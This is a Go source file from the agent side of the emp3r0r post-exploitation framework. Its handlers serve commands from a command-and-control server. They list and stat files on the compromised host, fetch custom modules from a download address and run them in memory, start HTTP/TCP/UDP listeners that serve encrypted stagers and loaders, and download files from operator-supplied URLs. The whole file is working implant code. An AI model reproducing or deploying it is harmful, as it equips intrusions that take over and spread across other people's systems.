package handler

import (
	"context"
	"encoding/base64"
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/fxamacker/cbor/v2"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/modules"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
	"github.com/jm33-m0/emp3r0r/core/lib/listener"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/spf13/cobra"
)



type listenerMeta struct {
	Type      string
	Port      string
	Stager    string
	Loader    string
	StartedAt time.Time
}

var ActiveListeners sync.Map // map[string]listenerMeta, key: type:port

// runListDir implements !ls --path <path>
func runListDir(cmd *cobra.Command, args []string) {
	path, _ := cmd.Flags().GetString("path")
	if path == "" {
		c2transport.NotifyC2(cmd, "Error: args error\n")
		return
	}

	// Helper to format memory file entries
	listMemFiles := func() {
		files := util.ListMemFiles()
		if len(files) == 0 {
			c2transport.NotifyC2(cmd, "")
			return
		}
		out := getMemFileCompletions(path, files)
		c2transport.NotifyC2(cmd, "%s", strings.Join(out, "\n"))
	}

	// Check for memory path
	if strings.HasPrefix(path, "mem:") { // match mem:, mem:/, mem://
		listMemFiles()
		return
	}

	var listPath string
	switch path {
	case ".":
		cwd, err := os.Getwd()
		if err != nil {
			c2transport.NotifyC2(cmd, "Error: %v\n", err)
			return
		}
		listPath = cwd
	default:
		absPath, err := filepath.Abs(path)
		if err != nil {
			c2transport.NotifyC2(cmd, "Error: %v\n", err)
			return
		}
		listPath = absPath
	}
	entries, err := os.ReadDir(listPath)
	if err != nil {
		c2transport.NotifyC2(cmd, "Error: cant read dir %s: %v\n", listPath, err)
		return
	}
	lines := []string{listPath}
	for _, entry := range entries {
		if entry.IsDir() {
			lines = append(lines, fmt.Sprintf("%s/", entry.Name()))
		} else {
			lines = append(lines, entry.Name())
		}
	}
	c2transport.NotifyC2(cmd, "%s", strings.Join(lines, "\n"))
}

// runStat implements !stat --path <path>
// runStat implements !stat --path <path>
func runStat(cmd *cobra.Command, args []string) {
	path, _ := cmd.Flags().GetString("path")
	if path == "" {
		c2transport.NotifyC2(cmd, "Error: args error\n")
		return
	}
	fi, err := os.Stat(path)
	if err != nil || fi == nil {
		c2transport.NotifyC2(cmd, "Error: cant stat file %s: %v\n", path, err)
		return
	}
	fstat := &util.FileStat{
		Name:       filepath.Base(path),
		Size:       fi.Size(),
		Checksum:   crypto.SHA256SumFile(path),
		Permission: fi.Mode().String(),
	}
	data, err := cbor.Marshal(fstat)
	if err != nil {
		c2transport.NotifyC2(cmd, "Error: %v\n", err)
		return
	}
	c2transport.NotifyC2Binary(cmd, data)
}

// runCustomModule implements !custom_module --mod_name <name> --invocation <base64> --checksum <checksum> --in_mem <bool> --type <payload_type> --file_to_download <file> --download_addr <addr>
func runCustomModule(cmd *cobra.Command, args []string) {
	modName, _ := cmd.Flags().GetString("mod_name")
	invocationB64, _ := cmd.Flags().GetString("invocation")
	checksum, _ := cmd.Flags().GetString("checksum")
	inMem, _ := cmd.Flags().GetBool("in_mem")
	payloadType, _ := cmd.Flags().GetString("type")
	fileToDownload, _ := cmd.Flags().GetString("file_to_download")
	downloadAddr, _ := cmd.Flags().GetString("download_addr")
	if modName == "" || checksum == "" {
		c2transport.NotifyC2(cmd, "Error: args error\n")
		return
	}
	invocation, err := decodeInvocation(invocationB64)
	if err != nil {
		c2transport.NotifyC2(cmd, "Error decoding invocation: %v\n", err)
		return
	}
	// in_mem is now default and only mode, ignored
	_ = inMem
	out := modules.ModuleHandler(downloadAddr, fileToDownload, payloadType, modName, checksum, invocation)
	c2transport.NotifyC2(cmd, "%s\n", out)
}

func decodeInvocation(b64 string) (def.ResolvedInvocation, error) {
	var inv def.ResolvedInvocation
	if b64 == "" {
		return inv, fmt.Errorf("empty invocation payload")
	}
	raw, err := base64.StdEncoding.DecodeString(b64)
	if err != nil {
		return inv, err
	}
	if err := cbor.Unmarshal(raw, &inv); err != nil {
		return inv, err
	}
	return inv, nil
}

// runListener implements !listener --type <http/tcp/udp> --port <port> --stager <path> --key <key> [--loader <path>]
func runListener(cmd *cobra.Command, args []string) {
	action, _ := cmd.Flags().GetString("action")
	listenerType, _ := cmd.Flags().GetString("type")
	port, _ := cmd.Flags().GetString("port")
	stagerPath, _ := cmd.Flags().GetString("stager")
	keyStr, _ := cmd.Flags().GetString("key")
	loaderPath, _ := cmd.Flags().GetString("loader")

	action = strings.ToLower(strings.TrimSpace(action))
	listenerType = strings.ToLower(strings.TrimSpace(listenerType))

	switch action {
	case "list":
		entries := []string{}
		httpSeen := false
		ActiveListeners.Range(func(key, value any) bool {
			meta, ok := value.(listenerMeta)
			if !ok {
				return true
			}
			if meta.Type == "http" {
				httpSeen = true
			}
			entries = append(entries, fmt.Sprintf("%s:%s stager=%s loader=%s started=%s",
				meta.Type, meta.Port, meta.Stager, meta.Loader, meta.StartedAt.Format(time.RFC3339)))
			return true
		})
		if !httpSeen {
			if httpPort, ok := listener.HTTPListenerPort(); ok {
				entries = append(entries, fmt.Sprintf("http:%s stager=%s loader=%s started=%s", httpPort, "unknown", "unknown", "unknown"))
			}
		}
		if len(entries) == 0 {
			c2transport.NotifyC2(cmd, "No active listeners\n")
			return
		}
		sort.Strings(entries)
		c2transport.NotifyC2(cmd, "%s\n", strings.Join(entries, "\n"))
		return
	case "stop":
		stopOne := func(t, p string) error {
			switch t {
			case "http":
				listener.StopHTTP()
				ActiveListeners.Delete("http:" + p)
				return nil
			case "tcp":
				err := listener.StopTCPListener(p)
				ActiveListeners.Delete("tcp:" + p)
				return err
			case "udp":
				err := listener.StopUDPListener(p)
				ActiveListeners.Delete("udp:" + p)
				return err
			default:
				return fmt.Errorf("unsupported listener type %s", t)
			}
		}

		stopped := 0
		errs := []string{}

		if listenerType != "" && listenerType != "http" && listenerType != "tcp" && listenerType != "udp" {
			c2transport.NotifyC2(cmd, "Error: unknown listener type '%s' (supported: http, tcp, udp)\n", listenerType)
			return
		}

		stoppedHTTP := false
		if listenerType != "" && port != "" {
			if err := stopOne(listenerType, port); err != nil {
				errs = append(errs, err.Error())
			} else {
				if listenerType == "http" {
					stoppedHTTP = true
				}
				stopped++
			}
		} else {
			keys := []string{}
			ActiveListeners.Range(func(key, value any) bool {
				k, ok := key.(string)
				if ok {
					keys = append(keys, k)
				}
				return true
			})
			for _, k := range keys {
				parts := strings.SplitN(k, ":", 2)
				if len(parts) != 2 {
					continue
				}
				t, p := parts[0], parts[1]
				if listenerType != "" && t != listenerType {
					continue
				}
				if err := stopOne(t, p); err != nil {
					errs = append(errs, err.Error())
					continue
				}
				if t == "http" {
					stoppedHTTP = true
				}
				stopped++
			}
		}

		if !stoppedHTTP && (listenerType == "" || listenerType == "http") {
			if _, ok := listener.HTTPListenerPort(); ok {
				listener.StopHTTP()
				stopped++
			}
		}

		if stopped == 0 && len(errs) == 0 {
			c2transport.NotifyC2(cmd, "No listeners matched stop criteria\n")
			return
		}
		msg := fmt.Sprintf("Stopped %d listener(s)", stopped)
		if len(errs) > 0 {
			msg += "\nErrors:\n" + strings.Join(errs, "\n")
		}
		c2transport.NotifyC2(cmd, "%s\n", msg)
		return
	case "start":
		// continue below
	default:
		c2transport.NotifyC2(cmd, "Error: unknown action '%s' (supported: start, list, stop)\n", action)
		return
	}

	if stagerPath == "" {
		c2transport.NotifyC2(cmd, "Error: stager not specified\n")
		return
	}
	if port == "" {
		c2transport.NotifyC2(cmd, "Error: port not specified\n")
		return
	}
	if listenerType != "http" && listenerType != "tcp" && listenerType != "udp" {
		c2transport.NotifyC2(cmd, "Error: unknown listener type '%s' (supported: http, tcp, udp)\n", listenerType)
		return
	}

	listener.SetNotifyCallback(func(msg string) {
		logging.Infof("%s", msg)
		c2transport.NotifyC2(cmd, "[listener] %s\n", msg)
	})

	logging.Infof("Got listener request: %v", args)
	errChan := make(chan error)

	switch strings.ToLower(strings.TrimSpace(listenerType)) {
	case "http":
		go func() {
			defer func() {
				if r := recover(); r != nil {
					logging.Errorf("HTTPAESCompressedListener panic: %v\n%s", r, util.CallStack())
					errChan <- fmt.Errorf("Listener panic: %v", r)
				}
			}()
			errChan <- listener.HTTPAESCompressedListener(stagerPath, port, keyStr, true, loaderPath)
		}()
	case "tcp":
		go func() {
			defer func() {
				if r := recover(); r != nil {
					logging.Errorf("TCPAESCompressedListener panic: %v\n%s", r, util.CallStack())
					errChan <- fmt.Errorf("Listener panic: %v", r)
				}
			}()
			errChan <- listener.TCPAESCompressedListener(stagerPath, port, keyStr, true, loaderPath)
		}()
	case "udp":
		go func() {
			defer func() {
				if r := recover(); r != nil {
					logging.Errorf("UDPAESCompressedListener panic: %v\n%s", r, util.CallStack())
					errChan <- fmt.Errorf("Listener panic: %v", r)
				}
			}()
			errChan <- listener.UDPAESCompressedListener(stagerPath, port, keyStr, true, loaderPath)
		}()
	default:
		c2transport.NotifyC2(cmd, "Error: unknown listener type '%s' (supported: http, tcp, udp)\n", listenerType)
		return
	}
	select {
	case err := <-errChan:
		if err != nil {
			c2transport.NotifyC2(cmd, "Error: %v\n", err)
		} else {
			ActiveListeners.Store(listenerType+":"+port, listenerMeta{
				Type:      listenerType,
				Port:      port,
				Stager:    stagerPath,
				Loader:    loaderPath,
				StartedAt: time.Now(),
			})
			c2transport.NotifyC2(cmd, "Listener started successfully\n")
		}
	case <-time.After(3 * time.Second):
		ActiveListeners.Store(listenerType+":"+port, listenerMeta{
			Type:      listenerType,
			Port:      port,
			Stager:    stagerPath,
			Loader:    loaderPath,
			StartedAt: time.Now(),
		})
		c2transport.NotifyC2(cmd, "Listener started successfully\n")
	}
}

// runFileServer implements !file_server --port <port> --switch <on/off>
func runFileServer(cmd *cobra.Command, args []string) {
	port, _ := cmd.Flags().GetString("port")
	serverSwitch, _ := cmd.Flags().GetString("switch")
	portInt, err := strconv.Atoi(port)
	if err != nil {
		c2transport.NotifyC2(cmd, "Error parsing port: %v\n", err)
		return
	}
	if serverSwitch == "on" {
		if c2transport.FileServerCtx != nil {
			c2transport.FileServerCancel()
		}
		c2transport.FileServerCtx, c2transport.FileServerCancel = context.WithCancel(context.Background())
		go c2transport.FileServer(portInt, c2transport.FileServerCtx, c2transport.FileServerCancel)
		c2transport.NotifyC2(cmd, "File server on port %s is now %s\n", port, serverSwitch)
	} else {
		if c2transport.FileServerCtx != nil {
			c2transport.FileServerCancel()
		}
		c2transport.NotifyC2(cmd, "File server on port %s is now %s\n", port, serverSwitch)
	}
}

// runFileDownloader implements !file_downloader --download_addr <url> --path <path> --checksum <checksum>
func runFileDownloader(cmd *cobra.Command, args []string) {
	url, _ := cmd.Flags().GetString("download_addr")
	path, _ := cmd.Flags().GetString("path")
	checksum, _ := cmd.Flags().GetString("checksum")
	if url == "" || path == "" {
		c2transport.NotifyC2(cmd, "Error: args error\n")
		return
	}
	downloadPath := fmt.Sprintf("%s/%s", os.TempDir(), util.FileBaseName(path))
	err := c2transport.FetchFileKCP(url, path, downloadPath, checksum)
	if err != nil {
		c2transport.NotifyC2(cmd, "Error: %v\n", err)
		return
	}
	c2transport.NotifyC2(cmd, "File downloaded to %s\n", path)
}

// getMemFileCompletions works as ls completion
func getMemFileCompletions(prefix string, files []string) []string {
	// Use a map to deduplicate entries
	entries := make(map[string]bool)

	for _, f := range files {
		if !strings.HasPrefix(f, prefix) {
			continue
		}

		// Get relative part
		rel := strings.TrimPrefix(f, prefix)
		if rel == "" {
			// Exact match (file or dir root?)
			// If it's a file, we might want to list it?
			// But typically ls lists contents.
			continue
		}

		// Find next separator
		// If rel starts with /, we treat / as the segment (directory)
		// e.g. path="mem:", rel="///file" -> seg="/"
		// path="mem:///", rel="file" -> seg="file"
		// path="mem:///dir", rel="/file" -> seg="/"

		seg := rel
		if idx := strings.Index(rel, "/"); idx != -1 {
			// Include the slash to indicate there is more
			seg = rel[:idx+1]
		}

		entries[seg] = true
	}

	var out []string
	// Prepend CWD line.
	out = append(out, prefix)

	for seg := range entries {
		out = append(out, seg)
	}
	// Sort for deterministic output
	sort.Strings(out[1:])

	return out
}
